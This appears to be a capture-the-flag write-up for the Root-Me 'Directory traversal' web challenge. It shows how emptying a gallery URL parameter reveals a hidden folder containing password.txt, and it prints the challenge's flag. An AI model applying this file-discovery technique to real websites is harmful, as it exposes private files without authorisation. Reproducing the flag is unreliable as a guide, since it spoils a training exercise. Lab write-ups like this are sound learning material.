---
title: Directory traversal
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, Path traversal]
---

* Points: 25
* Link: [https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal](https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal)

## Statement

> Find the hidden section of the photo galery.

## Analyzation

Click on the navigate bar, the url is kind of
```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=categories
```

Delete the para
```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=
```

There is a hidden section ```86hwnX2r```. Navigate into it
```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r
```

There is a ```password.txt``` file (see source code)
```
galerie/86hwnX2r/password.txt
```

## Solution

```
http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
```

The flag is
```
kcb$!Bx@v4Gs9Ez
```